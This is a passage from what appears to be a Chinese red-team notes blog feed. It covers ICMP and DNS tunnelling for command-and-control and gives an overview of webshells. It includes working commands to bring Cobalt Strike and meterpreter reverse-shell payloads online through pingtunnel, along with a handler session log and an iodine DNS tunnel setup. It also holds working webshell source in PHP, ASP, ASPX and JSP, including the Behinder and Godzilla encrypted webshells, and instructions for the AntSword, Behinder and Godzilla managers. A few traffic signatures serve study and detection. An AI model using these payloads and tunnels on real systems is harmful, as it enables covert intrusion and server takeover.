data-title=\"text\"><pre class=\"language-text\"><code>./pingtunnel -type server -noprint 1 -nolog 1\n</code></pre></div><p>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1\n\n# 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777\n</code></pre></div><ul>\n<li>\n<p>cobaltstrike创建listener\nhttps host和https port(c2)为ICMP隧道客户端的监听IP和端口\nhttps port(bind)为转发目的地址的端口</p>\n</li>\n<li>\n<p>生成反向payload的beacon</p>\n</li>\n<li>\n<p>上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线</p>\n</li>\n</ul>\n<h4>转发socks上线msf（失败）</h4>\n<blockquote>\n<p>按理说是这样的，但是流量里还是有tcp</p>\n</blockquote>\n<ul>\n<li>准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端</li>\n</ul>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>./pingtunnel <span class=\"token parameter variable\">-type</span> server <span class=\"token parameter variable\">-noprint</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-nolog</span> <span class=\"token number\">1</span>\n</code></pre></div><p>ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>pingtunnel.exe <span class=\"token parameter variable\">-type</span> client <span class=\"token parameter variable\">-l</span> <span class=\"token number\">127.0</span>.0.1:6688 <span class=\"token parameter variable\">-s</span> icmpserver_ip <span class=\"token parameter variable\">-sock5</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-nolog</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-noprint</span> <span class=\"token number\">1</span>\n<span class=\"token comment\"># 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址</span>\n<span class=\"token comment\"># icmpserver_ip 192.168.1.10</span>\n</code></pre></div><p>生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>msfvenom <span class=\"token parameter variable\">-p</span> windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span>c2_server_ip <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">8443</span> <span class=\"token assign-left variable\">HttpProxyType</span><span class=\"token operator\">=</span>SOCKS <span class=\"token assign-left variable\">HttpProxyHost</span><span class=\"token operator\">=</span><span class=\"token number\">127.0</span>.0.1 <span class=\"token assign-left variable\">HttpProxyPort</span><span class=\"token operator\">=</span><span class=\"token number\">6688</span> <span class=\"token parameter variable\">-f</span> exe <span class=\"token parameter variable\">-o</span> meterpreter.exe\n<span class=\"token comment\"># c2_server_ip 192.168.1.10</span>\n</code></pre></div><p>启动msf监听，等待meterpreter执行上线</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>msf6 &gt; use exploit/multi/handler\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nlhost =&gt; 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 6688\nlport =&gt; 6688\nmsf6 exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 0.0.0.0:6688 \n[*] Sending stage (200774 bytes) to 192.168.1.11\n[*] Meterpreter session 4 opened (192.168.1.10:6688 -&gt; 192.168.1.11:59957) at 2024-01-16 02:17:38 -0500\n\nmeterpreter &gt; getuid\nServer username: ECHO0D-WIN\\echo0d\n</code></pre></div><figure><figcaption>image-20240116152131909</figcaption></figure>\n<p>此处不确定是否成功，因为夹杂了TCP</p>\n<figure><figcaption>image-20240116153846286</figcaption></figure>\n<h4>流量特征</h4>\n<p>icmp包长度突然变化，就是有tcp流量要发</p>\n<figure><figcaption>image-20240109230229832</figcaption></figure>\n<p>以及突然流量包数量变多</p>\n<figure><figcaption>image-20240109230426359</figcaption></figure>\n<h2>2. DNS隧道</h2>\n<h3>2.1 iodine</h3>\n<blockquote>\n<p>以下的服务器和域名均来自腾讯云</p>\n<p>服务器：https://cloud.tencent.com/product/cvm?from=10680</p>\n<p>域名解析：https://cloud.tencent.com/product/cns?from=10680</p>\n</blockquote>\n<p>iodine是基于C语言开发的，分为服务端和客户端。iodine支持转发模式和中继模式。其原理是：通过TAP虚拟网卡，在服务端建立一个局域网，在客户端也通过TAP建立一个虚拟网卡，两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为dns0的虚拟网卡。</p>\n<p>与同类工具相比，iodine具有如下特点：</p>\n<blockquote>\n<p>参考https://cloud.tencent.com/developer/article/1937092</p>\n</blockquote>\n<ul>\n<li>不会对下行数据进行编码</li>\n<li>支持多平台(Linux、Windows、MacOS)</li>\n<li>支持16个并发连接</li>\n<li>支持强密码机制</li>\n<li>支持同网段隧道IP地质(不同于服务器一客户端网段)</li>\n<li>支持多种DNS记录类型</li>\n<li>提供了丰富的隧道质量检测措施</li>\n</ul>\n<h4>1. 部署域名解析</h4>\n<blockquote>\n<p>https://console.dnspod.cn/</p>\n</blockquote>\n<p>首先，用一台公网的Linux系统的VPS作为C&amp;C服务器，并准备好一个可以配置的域名(这里我们假设是<code>dnslog1.site</code>)。然后配置域名的记录，如下：</p>\n<figure><figcaption>dnspod</figcaption></figure>\n<p>创建记录A，将自己的域名<code>dns.dnslog1.site</code>解析到VPS服务器地址。然后创建NS记录，将 <code>dns2tcp.dnslog1.site </code>指向 <code>dns.dnslog1.site </code>。</p>\n<ul>\n<li>第一条A类解析是在告诉域名系统，<code>dns.dnslog1.site</code>的IP地址是 <code>xx.xx.xx.xx</code> 。</li>\n<li>第二条NS解析是在告诉域名系统，想要知道<code>dns2tcp.dnslog1.site</code>的IP地址，就去问<code>dns.dnslog1.site</code> 。</li>\n</ul>\n<p><strong>验证域名解析设置是否成功</strong></p>\n<p>在随便一台电脑上ping域名<code>dns.dnslog1.site</code>，若能ping通，且显示的IP地址是我们配置的VPS的地址，说明第一条A类解析设置成功并已生效。</p>\n<p>然后在我们的VPS上执行以下命令监听UDP 53端口</p>\n<div class=\"language-javascript\" data-ext=\"js\" data-title=\"js\"><pre class=\"language-javascript\"><code>tcpdump <span class=\"token operator\">-</span>n <span class=\"token operator\">-</span>i eth0 udp dst port <span class=\"token number\">53</span>\n</code></pre></div><p>在任意一台机器上执行  <code>nslookup dns2tcp.dnslog1.site </code>命令，如果在我们的VPS监听的端口有查询信息，说明第二条记录设置成功。</p>\n<h4>2. 安装并启动服务端</h4>\n<p>提前检查VPS服务器防火墙的53端口是否打开：</p>\n<figure><figcaption>port</figcaption></figure>\n<p>这里用的服务端是Centos7系统，可以执行安装命令：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>yum -y install iodine \n</code></pre></div><p>如果是Windows系统，可以安装编译好的对应版本的iodine。</p>\n<p>执行以下命令启动服务端：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>iodined -f -c -P root@123456 172.16.10.1 dns2tcp.dnslog1.site -DD\n    -f：在前台运行\n    -c：禁止检查所有传入请求的客户端IP地址\n    -P：指定密码\n    -D：指定调试级别。-DD指第二级，D的数量随等级增加\n    这里的172.16.10.1是自定义的局域网虚拟IP地址\n</code></pre></div><figure><figcaption>server</figcaption></figure>\n<p>服务端启动成功后，VPS上多了一块dns0的网卡，ip为我们设置的172.16.10.1</p>\n<figure><figcaption>ifconfig_server</figcaption></figure>\n<h4>3. 安装并启动客户端</h4>\n<p><strong>Windows系统</strong></p>\n<p>如果是Windows系统，直接执行下面命令启动客户端，但是启动的过程中，会遇到杀毒软件的报毒，并且需要管理员权限执行命令才可以启动。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>iodine.exe -f -P root@123456 dns2tcp.dnslog1.site\n</code></pre></div><p><strong>Linux系统</strong></p>\n<p>如果是Linux系统，先安装iodine。上传iodlie客户端到目标主机，解压，进入目录安装</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>cd iodine-0.7.0/\nmake &amp;&amp; make install\n</code></pre></div><p>kali默认安装了iodine，执行下面命令连接服务端(需要root权限)，如图连接成功。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>iodine -f -P root@123456 dns2tcp.dnslog1.site\n</code></pre></div><figure><figcaption>client</figcaption></figure>\n<p>连接成功后，客户端上新建了一个dns0的网卡，IP地址为172.16.10.2</p>\n<figure><figcaption>ifconfig_client</figcaption></figure>\n<p>然后ping服务端地址</p>\n<figure><figcaption>pingserver</figcaption></figure>\n<h4>4. 使用DNS隧道</h4>\n<p>客户端和服务端连接成功后，由于客户端和服务端处在一个逻辑的局域网中，所以可以直接通。</p>\n<p><strong>服务端SSH连接客户端</strong></p>\n<figure><figcaption>ssh</figcaption></figure>\n<p><strong>客户端SSH连接服务端</strong></p>\n<figure><figcaption>ssh2</figcaption></figure>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "WebShell相关知识整理",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/WebShell.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/WebShell.html",
      "summary": "WebShell相关知识整理\nWebShell简介\n概念\n从名字来看Web指的是网页服务，Shell指的是计算机程序运行的指令命令。\nWebShell通常是一个命令执行环境，其形式为ASP、ASPX、PHP、JSP等，还有比较特殊的无文件落地的内存马，也称为Web后门。黑客通常利用常见的漏洞，如文件上传漏洞、反序列化、SQL注入、远程文件包含、FTP，...",
      "content_html": "\n<h2>WebShell简介</h2>\n<h3>概念</h3>\n<p>从名字来看Web指的是网页服务，Shell指的是计算机程序运行的指令命令。</p>\n<p>WebShell通常是一个命令执行环境，其形式为ASP、ASPX、PHP、JSP等，还有比较特殊的无文件落地的内存马，也称为Web后门。黑客通常利用常见的漏洞，如文件上传漏洞、反序列化、SQL注入、远程文件包含、FTP，甚至使用跨站脚本攻击(XSS)等方式入侵网站，将WebShell后门文件放置网站服务器的Web目录中(或直接注入内存马)，然后利用浏览器或WebShell管理工具访问这些后门，获取命令执行环境，从而控制网站或Web服务器。</p>\n<blockquote>\n<p>下面如无特殊说明，WebShell均指普通的有文件的WebShell。</p>\n</blockquote>\n<p>以php语言为例，简单的一句话木马<code>demo.php</code>如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>&lt;?php @eval($_GET[\"cmd\"]); ?&gt;\n</code></pre></div><p>上面的代码含义是：<code>eval() </code>函数会获取 <code>cmd </code>参数中代码来执行，将该文件放到目标网站的Web目录下，如访问<code>http://ip:port/demo.php?cmd=echo 'hello,world!';</code> ，结果会打印出 <code>hello world!</code></p>\n<p>可以通过访问该文件实现对网站服务器进行操控，包括执行系统命令、读取数据库、删除文件、修改主页等都可以做到。这样一个简单的语句就可以为黑客入侵打开一扇大门，让黑客可以随意地执行任意代码。</p>\n<h3>利用前提</h3>\n<ul>\n<li>WebShell可以被放置在服务器的Web目录</li>\n<li>知道WebShell文件的具体位置及文件名并且能访问到</li>\n<li>WebShell能被服务器解析执行</li>\n<li>文件没有被杀毒软件查杀</li>\n</ul>\n<h3>分类</h3>\n<ul>\n<li>按照功能的多少，一般分为大马、小马、一句话木马三种：</li>\n</ul>\n<p>大马：大马WebShell功能齐全，通常由多个文件组成，包括木马核心、二进制文件、配置文件等，能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权。由于这种大型木马的体量比较大，上传过程中容易被检测且不方便进行上传绕过测试。</p>\n<p>小马：我们在上传文件的时候，可能会出现被限制上传的文件大小或是被拦截的情况，那么可以通过小马来上传大马，小马的功能通常是围绕文件管理的功能（文件上传、文件修改、新建文件等）</p>\n<p>一句话木马：短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理WebShell。</p>\n<p>小马拉大马这个阶段使用的木马都是将功能函数写死在木马文件中，然后执行固定的功能，而一句话木马的原理则是在服务端就一句话，然后使用蚁剑等客户端通过发送功能函数到服务端，服务端将功能函数进行执行并将结果返回给客户端，然后解析并显示结果，这就是这两种阶段的核心区别。</p>\n<ul>\n<li>按照脚本编写语言分类，可以分为PHP(文件后缀.php)、ASP(文件后缀.asp)、JSP(文件后缀.jsp)、ASP.NET(文件后缀.aspx)、PYTHON(文件后缀.py)、CGI(文件后缀.pl .cgi)等</li>\n</ul>\n<p>常见的基础的一句话木马如下：</p>\n<p>php</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>\n</code></pre></div><p>asp</p>\n<div class=\"language-asp\" data-ext=\"asp\" data-title=\"asp\"><pre class=\"language-asp\"><code>&lt;%execute request(\"password\")%&gt;\n</code></pre></div><p>aspx</p>\n<div class=\"language-aspx\" data-ext=\"aspx\" data-title=\"aspx\"><pre class=\"language-aspx\"><code>&lt;%@ Page Language=\"Jscript\"%&gt;&lt;%eval(Request.Item[\"password\"],\"unsafe\");%&gt;\n</code></pre></div><p>jsp无回显</p>\n<div class=\"language-jsp\" data-ext=\"jsp\" data-title=\"jsp\"><pre class=\"language-jsp\"><code>&lt;%Runtime.getRuntime().exec(request.getParameter(\"password\"));%&gt;\n</code></pre></div><p>jsp有回显</p>\n<div class=\"language-jsp\" data-ext=\"jsp\" data-title=\"jsp\"><pre class=\"language-jsp\"><code>&lt;%\n    if(\"023\".equals(request.getParameter(\"pwd\"))){\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"password\")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print(\"&lt;pre&gt;\");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print(\"&lt;/pre&gt;\");\n    }\n%&gt;\n</code></pre></div><h2>WebShell管理工具</h2>\n<h3>1. 蚁剑(AntSword)</h3>\n<p>AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及有授权的安全研究人员以及网站管理员的需求。</p>\n<p>github项目地址：https://github.com/AntSwordProject/antSword</p>\n<p>官方加载器： https://github.com/AntSwordProject/AntSword-Loader</p>\n<p>具体使用可以参考：https://www.yuque.com/antswordproject/antsword/lmwppk</p>\n<figure><figcaption>image-20230815141739231</figcaption></figure>\n<p><strong>蚁剑支持的webshell类型如下：</strong></p>\n<figure><figcaption>image-20230815140202778</figcaption></figure>\n<h4>安装步骤</h4>\n<p>1、下载源码和加载器两个文件并解压</p>\n<p>2、进入loader文件夹，运行名为AntSword的可执行文件</p>\n<figure><figcaption>image-20230810161246585</figcaption></figure>\n<p>3、点击初始化，选择前面解压好的源码文件夹</p>\n<figure><figcaption>image-20230810161645463</figcaption></figure>\n<p>4、等待一会，安装完成，后面使用直接点击步骤1中的文件即可开启。</p>\n<h4>基本使用</h4>\n<p>1、将WebShell上传到服务器</p>\n<figure><figcaption>image-20230814100429716</figcaption></figure>\n<p>2、使用蚁剑连接</p>\n<figure><figcaption>image-20230814101022263</figcaption></figure>\n<p>3、连接成功后即可右键选择</p>\n<figure><figcaption>image-20230814101129511</figcaption></figure>\n<p><strong>虚拟终端执行命令</strong></p>\n<figure><figcaption>image-20230814101308245</figcaption></figure>\n<p><strong>选择文件管理</strong></p>\n<figure><figcaption>image-20230814101354396</figcaption></figure>\n<p><strong>选择数据操作</strong></p>\n<figure><figcaption>image-20230814102523579</figcaption></figure>\n<p><strong>选择浏览网站</strong></p>\n<figure><figcaption>image-20230814102856901</figcaption></figure>\n<p>还内置了一个cookie记录的功能</p>\n<figure><figcaption>image-20230814102939876</figcaption></figure>\n<p><strong>插件市场</strong></p>\n<p>点击绿色图标即可安装，安装成功后可以在本地仓库查看。</p>\n<figure><figcaption>image-20230814104549589</figcaption></figure>\n<p>插件使用：</p>\n<figure><figcaption>image-20230814104756732</figcaption></figure>\n<p><strong>配置代理</strong></p>\n<figure><figcaption>image-20230815140737346</figcaption></figure>\n<p><strong>编码设置</strong></p>\n<figure><figcaption>image-20230815140901874</figcaption></figure>\n<figure><figcaption>image-20230815141340336</figcaption></figure>\n<p>还可以配置RSA加密</p>\n<figure><figcaption>image-20230815141103112</figcaption></figure>\n<h4>流量</h4>\n<p><strong>php</strong>马如下：</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span>\n</code></pre></div><p>流量特征：base64_decode()</p>\n<figure><figcaption>image-20230814110613830</figcaption></figure>\n<p><strong>asp</strong>马如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>&lt;%eval request (\"pass\")%&gt;\n</code></pre></div><p>流量特征：=eval() cute</p>\n<figure><figcaption>image-20230814144237044</figcaption></figure>\n<p><strong>jsp</strong>马如下：</p>\n<div class=\"language-jsp\" data-ext=\"jsp\" data-title=\"jsp\"><pre class=\"language-jsp\"><code>&lt;%!\n    class U extends ClassLoader {\n        U(ClassLoader c) {\n            super(c);\n        }\n        public Class g(byte[] b) {\n            return super.defineClass(b, 0, b.length);\n        }\n    }\n\n    public byte[] base64Decode(String str) throws Exception {\n        try {\n            Class clazz = Class.forName(\"sun.misc.BASE64Decoder\");\n            return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str);\n        } catch (Exception e) {\n            Class clazz = Class.forName(\"java.util.Base64\");\n            Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);\n            return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str);\n        }\n    }\n%&gt;\n&lt;%\n    String cls = request.getParameter(\"passwd\");\n    if (cls != null) {\n        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n    }\n%&gt;\n\n</code></pre></div><figure><figcaption>image-20230815135824974</figcaption></figure>\n<p>此处passwd=后面的值为class文件的base64编码。</p>\n<h3>2. 冰蝎(Behinder)</h3>\n<p>冰蝎”是一款动态二进制加密网站管理客户端。</p>\n<p>github地址：https://github.com/rebeyond/Behinder</p>\n<p>\"冰蝎\"客户端基于JAVA，所以可以跨平台使用，23年最新版本为4.0.6，兼容性较之前的版本有较大提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大</p>\n<h4>安装及使用</h4>\n<p>下载冰蝎后，server文件夹内为默认的webshell代码，挑选需要的使用即可。</p>\n<p>以php为例，加密密钥硬编码进了webshell代码里</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"e45e329feb5d925b\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span>\n\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'k'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">session_write_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$post</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">extension_loaded</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'openssl'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token variable\">$t</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"base64_\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"decode\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$post</span><span class=\"token operator\">=</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\n\t\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    \t\t\t <span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n    \t\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">else</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token variable\">$post</span><span class=\"token operator\">=</span><span class=\"token function\">openssl_decrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"AES128\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$arr</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'|'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$func</span><span class=\"token operator\">=</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$params</span><span class=\"token operator\">=</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">C</span><span class=\"token punctuation\">{</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n    @<span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$params</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n</code></pre></div><p>jsp</p>\n<div class=\"language-jsp\" data-ext=\"jsp\" data-title=\"jsp\"><pre class=\"language-jsp\"><code>&lt;% @page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\" %&gt;\n&lt;% !class U extends ClassLoader { \n    U(ClassLoader c) { \n        super(c); \n    } \n    public Class g(byte []b) { \n        return super.defineClass(b, 0, b.length); \n    } \n} \n%&gt;\n&lt;% if (request.getMethod().equals(\"POST\")) {\n    String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/\n    session.putValue(\"u\", k);\n    Cipher c = Cipher.getInstance(\"AES\"); \n    c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); \n    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext); \n}\n%&gt;\n</code></pre></div><p>文件上传步骤同上，右键-新增，填写好webshell信息</p>\n<figure><figcaption>image-20230815165140852</figcaption></figure>\n<p>点击保存即可。右键可以打开，信息若填写正确，右侧的状态一栏，会出现绿色点</p>\n<figure><figcaption>image-20230815165240153</figcaption></figure>\n<figure><figcaption>image-20230815164940653</figcaption></figure>\n<p>命令执行</p>\n<figure><figcaption>image-20230815165508299</figcaption></figure>\n<p>虚拟终端</p>\n<figure><figcaption>image-20230815165549249</figcaption></figure>\n<p>文件管理</p>\n<figure><figcaption>image-20230815165647113</figcaption></figure>\n<p>内网穿透</p>\n<figure><figcaption>image-20230815165830937</figcaption></figure>\n<p>反弹shell</p>\n<figure><figcaption>image-20230815170015117</figcaption></figure>\n<p>数据库管理</p>\n<figure><figcaption>image-20230815170118557</figcaption></figure>\n<p>平行空间</p>\n<figure><figcaption>image-20230815170731689</figcaption></figure>\n<p>注入内存马（仅java）</p>\n<figure><figcaption>image-20230815180414912</figcaption></figure>\n<figure><figcaption>image-20230815180428861</figcaption></figure>\n<h4>流量</h4>\n<p>AES加密的</p>\n<figure><figcaption>image-20230815171655564</figcaption></figure>\n<h3>3. 哥斯拉(Godzilla)</h3>\n<p>支持jsp、php、aspx等多种载荷，java和c#的载荷原生实现AES加密，PHP使用异或加密。</p>\n<p>github项目地址：https://github.com/BeichenDream/Godzilla/releases/download/v4.0.1-godzilla/godzilla.jar</p>\n<h4>安装及使用</h4>\n<p>下载后直接执行如下命令即可运行</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>java -jar godzilla.jar\n</code></pre></div><p>Godzilla支持的webshell类型如下：</p>\n<figure><figcaption>image-20230815142844497</figcaption></figure>\n<p>首先用Godzilla生成payload</p>\n<figure><figcaption>image-20230815143232725</figcaption></figure>\n<p>PHP_EVAL_XOR_BASE64生成的php文件：</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"pass\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</span></code></pre></div><p>PHP_XOR_BASE64</p>\n<div class=\"language-php\" data-ext=\"php\" data-title=\"php\"><pre class=\"language-php\"><code><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n@<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token 